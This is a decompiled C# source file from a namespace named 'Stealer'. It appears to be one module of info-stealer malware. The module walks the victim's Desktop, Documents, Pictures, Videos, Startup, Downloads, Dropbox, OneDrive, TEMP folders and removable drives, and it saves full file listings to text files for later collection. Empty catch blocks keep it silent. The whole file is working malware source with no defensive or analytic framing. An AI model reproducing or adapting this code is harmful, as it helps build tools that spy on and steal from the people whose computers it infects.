﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer
{
	// Token: 0x0200001E RID: 30
	internal sealed class DirectoryTree
	{
		// Token: 0x0600008C RID: 140 RVA: 0x00004E0C File Offset: 0x0000300C
		private static string GetDirectoryTree(string path, string indentation = "\t", int maxLevel = -1, int deep = 0)
		{
			if (!Directory.Exists(path))
			{
				return "Directory not exists";
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(indentation, deep)) + directoryInfo.Name + "\\");
			if (maxLevel == -1 || maxLevel < deep)
			{
				try
				{
					foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
					{
						try
						{
							stringBuilder.Append(DirectoryTree.GetDirectoryTree(directoryInfo2.FullName, indentation, maxLevel, deep + 1));
						}
						catch (UnauthorizedAccessException)
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			try
			{
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					stringBuilder.AppendLine(string.Concat(Enumerable.Repeat<string>(indentation, deep + 1)) + fileInfo.Name);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00004F10 File Offset: 0x00003110
		private static string GetDirectoryName(string path)
		{
			string name = new DirectoryInfo(path).Name;
			if (name.Length == 3)
			{
				return "DRIVE-" + name.Replace(":\\", "");
			}
			return name;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00004F50 File Offset: 0x00003150
		public static void SaveDirectories(string sSavePath)
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					DirectoryTree.TargetDirs.Add(driveInfo.RootDirectory.FullName);
				}
			}
			foreach (string path in DirectoryTree.TargetDirs)
			{
				try
				{
					string directoryTree = DirectoryTree.GetDirectoryTree(path, "\t", -1, 0);
					string directoryName = DirectoryTree.GetDirectoryName(path);
					if (!directoryTree.Contains("Directory not exists"))
					{
						File.WriteAllText(Path.Combine(sSavePath, directoryName + ".txt"), directoryTree);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0400006F RID: 111
		private static List<string> TargetDirs = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.Startup),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
			Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
			Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
			Environment.GetEnvironmentVariable("TEMP")
		};
	}
}
